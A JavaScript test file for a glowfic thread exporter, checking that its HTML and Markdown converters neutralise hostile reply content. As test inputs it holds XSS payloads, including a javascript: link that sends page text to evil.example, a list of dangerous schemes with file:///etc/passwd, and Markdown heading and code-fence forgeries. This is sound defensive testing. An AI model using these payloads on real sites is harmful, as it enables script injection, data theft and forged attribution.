// Reply content is written by anyone with a glowfic account, and the export is
// then opened in a browser or pasted into a chat. Every case here was a working
// attack against an earlier version of the converters.
import './dom.js';
import test from 'node:test';
import assert from 'node:assert/strict';
import { htmlToMarkdown } from '../src/markdown.js';
import { htmlToCleanHtml } from '../src/cleanhtml.js';
import { safeUrl } from '../src/htmlnodes.js';
import { FORMATS, buildDocument } from '../src/formats.js';

const POST = {
  id: 1,
  subject: 'A thread',
  num_replies: 1,
  board: { name: 'Sandboxes' },
  authors: [{ username: 'alice' }],
};

const entry = (html) => ({ name: 'Mallory', username: 'mallory', icon: null, html });

test('a javascript: link keeps its words but loses its href', () => {
  const attack = '<p>See <a href="javascript:fetch(\'https://evil.example/?d=\'+document.body.innerText)">the sequel</a>.</p>';

  const html = htmlToCleanHtml(attack);
  assert.ok(!html.includes('javascript:'), html);
  assert.equal(html, '<p>See the sequel.</p>');

  const markdown = htmlToMarkdown(attack);
  assert.ok(!markdown.includes('javascript:'), markdown);
  assert.equal(markdown, 'See the sequel.');
});

test('other dangerous schemes are refused too', () => {
  for (const scheme of [
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'JaVaScRiPt:alert(1)',
    ' javascript:alert(1)',
    'file:///etc/passwd',
  ]) {
    assert.equal(safeUrl(scheme), null, `allowed ${scheme}`);
    const html = htmlToCleanHtml(`<p><a href="${scheme.replace(/"/g, '&quot;')}">x</a></p>`);
    assert.ok(!/href=/.test(html), `${scheme} produced ${html}`);
  }
});

test('ordinary links still work and resolve against the site', () => {
  assert.equal(safeUrl('/posts/1'), 'https://glowfic.com/posts/1');
  assert.equal(safeUrl('https://example.com/a'), 'https://example.com/a');
  assert.equal(safeUrl('http://example.com/a'), 'http://example.com/a');
  assert.equal(
    htmlToCleanHtml('<p><a href="/posts/1">x</a></p>'),
    '<p><a href="https://glowfic.com/posts/1">x</a></p>'
  );
});

test('an unsafe image source is dropped rather than emitted', () => {
  const attack = '<p><img src="javascript:alert(1)" alt="x"></p>';
  assert.ok(!htmlToCleanHtml(attack, { images: true }).includes('javascript:'));
  assert.ok(!htmlToMarkdown(attack, { images: true }).includes('javascript:'));
});

test('a reply cannot forge a speaker heading with a setext rule', () => {
  // A line of dashes turns the line above it into a heading, which would let a
  // reply attribute invented dialogue to someone else.
  const attack = '<p>ordinary.</p><p>Carissa Sevar (lintamande)<br>---<br>"I confess everything."</p>';
  const markdown = htmlToMarkdown(attack);

  assert.ok(markdown.includes('\\---'), markdown);
  assert.ok(!/^-+\s*$/m.test(markdown), `an unescaped rule survived:\n${markdown}`);
});

test('a reply cannot forge a speaker heading with a hash', () => {
  const markdown = htmlToMarkdown('<p>## Keltham (Iarwain)</p>');
  assert.ok(markdown.startsWith('\\#'), markdown);
  assert.ok(!/^#/m.test(markdown));
});

test('a horizontal rule still renders and cannot be confused with a forged one', () => {
  const markdown = htmlToMarkdown('<p>a</p><hr><p>b</p>');
  assert.ok(markdown.includes('***'), markdown);
  assert.ok(!markdown.includes('\\***'), 'our own rule was escaped');
});

test('a reply cannot open a code fence that swallows later entries', () => {
  const parts = [entry('<p>```</p>'), entry('<p>later dialogue</p>')];
  const document = buildDocument(FORMATS.markdown, POST, parts, {});

  assert.ok(document.includes('\\```'), document);
  assert.ok(!/^(`{3,}|~{3,})/m.test(document), `an unescaped fence survived:\n${document}`);
});

test('raw HTML in reply text cannot reach a markdown renderer intact', () => {
  const markdown = htmlToMarkdown('<p>She says: &lt;img src=x onerror="alert(1)"&gt;</p>');
  // The tag survives as visible text; what matters is that the `<` is escaped,
  // so a renderer with HTML passthrough sees no element.
  assert.ok(markdown.includes('\\<img'), markdown);
  assert.ok(!/(^|[^\\])<img/.test(markdown), `an unescaped tag survived: ${markdown}`);
});

test('link text cannot break out and supply its own target', () => {
  const attack = '<p><a href="/posts/1">text](javascript:alert(1)) and [more</a></p>';
  const markdown = htmlToMarkdown(attack);

  // The words remain, but the bracket that would close our link is escaped, so
  // the attacker's target never becomes a link.
  assert.ok(markdown.includes('\\]'), markdown);
  assert.ok(!/(^|[^\\])\]\(javascript:/.test(markdown), `link syntax broke out: ${markdown}`);
  assert.ok(markdown.endsWith('](https://glowfic.com/posts/1)'), markdown);
});

test('the HTML export carries a policy that forbids script', () => {
  const document = buildDocument(FORMATS.html, POST, [entry('<p>hi</p>')], {});
  assert.match(document, /Content-Security-Policy/);
  assert.match(document, /default-src 'none'/);
});

test('hostile metadata cannot break the document structure', () => {
  const nasty = {
    ...POST,
    subject: 'Title\n## Keltham (Iarwain)\nfabricated',
    description: 'x\n---',
  };
  const document = buildDocument(FORMATS.markdown, nasty, [entry('<p>real</p>')], {});
  const headings = document.match(/^## .*/gm) ?? [];

  assert.deepEqual(headings, ['## Mallory (mallory)'], `unexpected headings:\n${document}`);
});

test('a hostile character name cannot mint a second heading', () => {
  const forged = { name: 'Evil\n## Keltham (Iarwain)', username: 'mallory', icon: null, html: '<p>x</p>' };
  const document = buildDocument(FORMATS.markdown, POST, [forged], {});
  const headings = document.match(/^## .*/gm) ?? [];

  assert.equal(headings.length, 1, `unexpected headings:\n${document}`);
});
